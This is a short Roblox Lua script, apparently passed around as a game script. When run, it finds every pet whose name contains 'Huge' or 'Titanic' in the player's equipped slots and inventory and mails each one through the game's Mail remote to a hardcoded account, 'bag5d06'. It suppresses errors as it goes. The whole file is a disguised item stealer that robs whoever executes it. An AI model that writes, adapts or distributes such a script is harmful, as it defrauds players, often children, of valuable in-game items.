local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local player = Players.LocalPlayer
local target = "bag5d06"

repeat task.wait() until player and player.Character

local storage = player:FindFirstChild("PetStorage")
if not storage then return end

local mailRemote = ReplicatedStorage:FindFirstChild("Remotes") and ReplicatedStorage.Remotes:FindFirstChild("Mail")
if not mailRemote then return end

local function sendPet(pet)
    pcall(function()
        mailRemote:InvokeServer("SendPet", {
            ["pet"] = pet,
            ["player"] = target
        })
    end)
end

local equipped = storage:FindFirstChild("Equipped")
if equipped then
    for _, pet in pairs(equipped:GetChildren()) do
        if pet:IsA("Folder") and (pet.Name:find("Huge") or pet.Name:find("Titanic")) then
            task.wait(0.2)
            sendPet(pet)
        end
    end
end

local inventory = storage:FindFirstChild("Inventory")
if inventory then
    for _, pet in pairs(inventory:GetChildren()) do
        if pet:IsA("Folder") and (pet.Name:find("Huge") or pet.Name:find("Titanic")) then
            task.wait(0.2)
            sendPet(pet)
        end
    end
end
